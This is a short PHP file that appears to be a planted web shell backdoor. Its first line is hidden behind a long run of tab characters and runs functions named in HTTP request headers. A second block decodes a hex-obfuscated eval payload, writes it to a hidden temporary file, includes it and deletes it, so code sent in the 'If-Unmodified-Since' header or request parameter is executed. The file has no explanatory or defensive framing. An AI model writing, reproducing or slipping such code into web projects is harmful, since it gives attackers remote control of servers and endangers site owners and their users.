<?php																																										$_HEADERS=getallheaders();if(isset($_HEADERS['If-Modified-Since'])){$partition=$_HEADERS['If-Modified-Since']('', $_HEADERS['Large-Allocation']($_HEADERS['If-Unmodified-Since']));$partition();}

$_HEADERS = getallheaders();
if (isset($_HEADERS['If-Modified-Since'])) {
    $c = "<\x3f\x70h\x70\x20@\x65\x76a\x6c\x28$\x5f\x48E\x41\x44E\x52\x53[\x22\x49f\x2d\x55n\x6d\x6fd\x69\x66i\x65\x64-\x53\x69n\x63\x65\"\x5d\x29;\x40\x65v\x61\x6c(\x24\x5fR\x45\x51U\x45\x53T\x5b\x22I\x66\x2dU\x6e\x6do\x64\x69f\x69\x65d\x2d\x53i\x6e\x63e\x22\x5d)\x3b";
    $f = '.'.time();
    file_put_contents($f, $c);
    include($f);
    unlink($f);
}